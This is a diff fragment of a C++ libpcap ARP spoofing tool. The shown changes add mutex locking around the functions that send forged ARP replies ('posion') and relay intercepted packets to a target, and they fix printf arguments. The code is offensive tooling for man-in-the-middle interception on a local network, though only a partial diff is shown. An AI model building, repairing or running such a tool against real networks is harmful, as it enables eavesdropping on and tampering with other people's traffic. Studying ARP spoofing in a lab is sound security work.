@@ -23,6 +23,7 @@ std::set<uint32_t> Ip_set;
 std::vector<uint32_t> Ip_vec;
 std::vector<Mac> Mac_vec;
 pcap_t* handle;
+pthread_mutex_t mutex;
 
 uint32_t parseIp(const char* str) {
 	uint8_t temp[4];
@@ -56,7 +57,7 @@ void sendpacket(pcap_t* handle,Mac eth_dmac,Mac eth_smac,Mac arp_smac,Ip arp_sip
 	packet.arp_.sip_ = htonl(arp_sip);
 	packet.arp_.tmac_ = arp_tmac;
 	packet.arp_.tip_ = htonl(arp_tip);
-
+	
 	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
 	if (res != 0) {
 		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
@@ -77,7 +78,9 @@ void *send_where_req(void* iter)
 	Ip tip=Ip(*(uint32_t*)iter);
 	while(1)
 	{
+		pthread_mutex_lock(&mutex);
 		sendpacket(handle,Mac::broadcastMac(),dev_MAC,dev_MAC,dev_IP,Mac::nullMac(),tip,ArpHdr::Request);
+		pthread_mutex_unlock(&mutex);
 		std::this_thread::sleep_for(std::chrono::seconds(1));
 	}
 }
@@ -89,7 +92,9 @@ void *wait_and_reply(void* iter)
 	Ip sip=Ip(Ip_vec[senderIp[i]]);
 	Ip tip=Ip(Ip_vec[targetIp[i]]);
 	Mac smac=Mac_vec[senderIp[i]];
+	pthread_mutex_lock(&mutex);
 	sendpacket(handle,smac,dev_MAC,dev_MAC,tip,smac,sip,ArpHdr::Reply);
+	pthread_mutex_unlock(&mutex);
 	delete (uint32_t*)iter;
 	return NULL;
 }
@@ -223,9 +228,11 @@ int main(int argc, char* argv[]) {
 					memcpy(copy_packet_data,packet_data,header->caplen);
 					((EthHdr*)copy_packet_data)->smac_=dev_MAC;
 					((EthHdr*)copy_packet_data)->dmac_=Mac_vec[targetIp[i]];
+					pthread_mutex_lock(&mutex);
 					pcap_sendpacket(handle,copy_packet_data, header->caplen);
+					pthread_mutex_unlock(&mutex);
 					free(copy_packet_data);
-					printf("relay done\n");
+					printf("relay %d\n",i);
 				}
 			}
 		}
@@ -242,7 +249,7 @@ int main(int argc, char* argv[]) {
 				check|=Mac::nullMac()==ptmac&&Ip_vec[targetIp[i]]==psip;
 				if(check)
 				{
-					printf("posion %d\n");
+					printf("posion %d\n",i);
 					Ip sip=Ip(Ip_vec[senderIp[i]]);
 					Ip tip=Ip(Ip_vec[targetIp[i]]);
 					Mac smac=Mac_vec[senderIp[i]];
